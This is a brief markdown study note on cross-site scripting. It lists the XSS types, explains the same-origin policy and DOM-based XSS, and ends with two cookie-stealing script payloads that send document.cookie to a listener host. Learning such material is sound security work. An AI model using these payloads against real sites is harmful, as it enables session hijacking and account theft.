# Cross Site Scripting (XSS)

> Reflected XSS
> 
> Stored XSS
> 
> DOM based XSS
> 
> Blind XSS
> 
> Mutation based XSS
> 

What is Same Origin Policy (SOP) ?
A Policy that stops one website from reading or writing data to another

The policy checks:
> protocol
>
> host
>
> port


### DOM Based XSS

In DOM XSS, the page itself (the HTTP response that is) does not change.

<img src="/path/to/user_input" onload="alert(1)">

[payload] -injected-> [ js code ] -executes-> [ creates object including payload] -renders-

## Cookie Stealing
<script>document.write('<img src="http://127.0.0.1:8888/?'+document.cookie+'">');</script>
<script>window.location='http://127.0.0.1:8888/?cookie='+document.cookie</script>




